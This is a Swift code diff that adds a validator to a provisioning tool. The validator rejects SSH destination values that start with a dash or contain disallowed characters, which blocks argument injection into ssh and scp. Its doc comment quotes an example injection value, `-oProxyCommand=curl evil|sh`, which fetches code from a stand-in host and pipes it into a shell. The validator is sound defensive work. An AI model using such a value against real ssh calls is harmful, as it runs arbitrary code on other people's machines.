@@ -109,6 +109,21 @@ public struct ConduitProvisioner: Sendable {
         }
     }
 
+    /// Whether `destination` is safe to pass as a bare argv element to `ssh`/`scp`.
+    ///
+    /// `Process.arguments` bypasses the shell, so the risk is NOT `;`/backtick injection
+    /// but ARGUMENT injection: OpenSSH parses argv with getopt and does not require options
+    /// to precede the destination, so a value beginning with `-` (e.g.
+    /// `-oProxyCommand=curl evil|sh`) is read as a client OPTION and runs an arbitrary local
+    /// program. Reject a leading `-` and whitelist the `[user@]host[:port]` charset. Kept
+    /// here (not in the executable) so it is unit-testable.
+    public static func isSafeSSHDestination(_ destination: String) -> Bool {
+        guard !destination.isEmpty, !destination.hasPrefix("-") else { return false }
+        let allowed = Set(
+            "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789._-@:")
+        return destination.allSatisfy { allowed.contains($0) }
+    }
+
     /// The argv `eldrctl` passes to the bootstrap on the target (after staging the payload).
     /// Order is stable for testability.
     public func scriptArguments() -> [String] {
